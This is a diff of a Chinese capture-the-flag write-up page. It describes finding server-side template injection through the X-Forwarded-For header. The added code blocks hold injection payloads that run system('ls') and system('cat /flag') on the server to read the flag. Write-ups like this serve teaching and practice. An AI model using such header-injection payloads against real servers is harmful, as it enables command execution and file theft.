@@ -22,10 +22,14 @@
 </div>
 <p><img data-src="https://i.loli.net/2021/01/22/qtWNdmsM8lYQCvb.png" alt="" /></p>
 <p>可以看到 IP 地址发生了变化，直接将 127.0.0.1 输出到了页面上；借助搜索引擎我发现一篇<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2FuZ3RhbnpoaS9wLzEyMjM4Nzc5Lmh0bWw=">大佬的博客</span>，里面实际验证了这是一种 SSTI 模板注入；</p>
-<p>&lt;li&gt; 尝试构造 payload: &lt;/li&gt;</p>
+<p><span class="green">尝试构造 payload:</span></p>
+<pre><code>X-Forwarded-For: &#123;&#123;system("ls")&#125;&#125;
+</code></pre>
 <p><img data-src="https://i.loli.net/2021/01/22/L7Kyc5H4ZSsqpAG.png" alt="" /><br />
 发现 flag 文件，利用 cat 拿取 flag;</p>
-<p>&lt;li&gt; 构造 payload: &lt;/li&gt;</p>
+<p><span class="green">构造 payload:</span></p>
+<pre><code>X-Forwarded-For: &#123;&#123;system("cat /flag")&#125;&#125;
+</code></pre>
 <p><img data-src="https://i.loli.net/2021/01/22/ZfEkqNSDOgRCWl9.png" alt="" /></p>
 <p>于是拿到了 flag, 放入题目中 sumbit;yas</p>
 ]]></content>
